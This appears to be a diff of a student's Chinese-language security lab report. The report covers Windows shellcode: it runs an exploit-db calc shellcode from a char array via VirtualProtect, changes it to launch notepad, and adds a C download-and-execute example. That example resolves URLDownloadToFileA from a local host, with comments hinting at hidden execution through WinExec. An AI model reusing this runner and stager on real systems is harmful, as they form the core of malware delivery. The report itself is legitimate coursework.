@@ -5,7 +5,7 @@
 - [x] 能从汇编源码编译通过并成功dump  
 - [x] 搜索Windows PEB结构体，PE文件导入表导出表相关数据结构的文档，解读shellcode原理  
 - [x] 修改shellcode功能为运行记事本程序notepad.exe  
-- [ ] (选做)修改shellcode功能为下载执行器，即下下载一个可执行文件，然后再运行  
+- [x] (选做)修改shellcode功能为下载执行器，即下下载一个可执行文件，然后再运行  
 
 ### 实验过程  
 
@@ -13,8 +13,8 @@
 [shellcode源代码](https://www.exploit-db.com/shellcodes/48116)  
 新建`calc.c`文件  
 ```C
-    #include <windows.h>
-    #include <stdio.h>
+#include <windows.h>
+#include <stdio.h>
 
     char code[] = \
     "\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
@@ -33,11 +33,11 @@
 
     int main(int argc, char **argv)
     {
-    int (*func)();//函数指针
-    func = (int(*)()) code;
-    DWORD old_protect;
-	VirtualProtect(code, sizeof(code), PAGE_EXECUTE_READWRITE, &old_protect);
-    (int)(*func)();
+        int (*func)();//函数指针
+        func = (int(*)()) code;
+        DWORD old_protect;
+        VirtualProtect(code, sizeof(code), PAGE_EXECUTE_READWRITE, &old_protect);
+        (int)(*func)();
     }
 ```  
 成功运行  
@@ -99,5 +99,38 @@ int main(int argc, char** argv)
 ```  
 成功运行  
 ![成功运行](./image/成功运行.png)  
+
+##### 修改shellcode功能为下载执行器，即下下载一个可执行文件，然后再运行  
+tips：使用原生API UrlDownloadToFileA  
+在主机上开放端口供下载可执行文件  
+`python -m http.service`  
+![开放端口](./image/开放端口.png)  
+新建download.c文件  
+```C
+#include<Windows.h>
+#include<urlmon.h>
+
+typedef int(WINAPI* MY_DOWNLOAD_PROC)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK);
+
+int main()
+{
+	HMODULE hurlmod = LoadLibrary("urlmon.dll");//手动加载urlmon.dll
+	MY_DOWNLOAD_PROC function_ptr = (MY_DOWNLOAD_PROC)GetProcAddress(hurlmod, "URLDownloadToFileA");
+	function_ptr(NULL, "http://127.0.0.1:8000/Desktop/calc.exe", "a.exe", 0, NULL);
+//老师写的参考
+	//URLDownloadToFile(NULL, "http://baidu.com", "a.html", 0, NULL);
+	//CreateProcess
+	//WinExec("a.exe", SW_HIDE);
+}
+```  
+成功运行  
+![成功运行](./image/成功.png)  
+
+#### 问题及解决  
+问题：运行时引发异常  
+![引发异常](./image/异常.png)  
+解决：修改字符集  
+![修改字符集](./image/解决.png)  
+参考：[CSDN](https://blog.csdn.net/qq_39446329/article/details/108151735)  
 
 
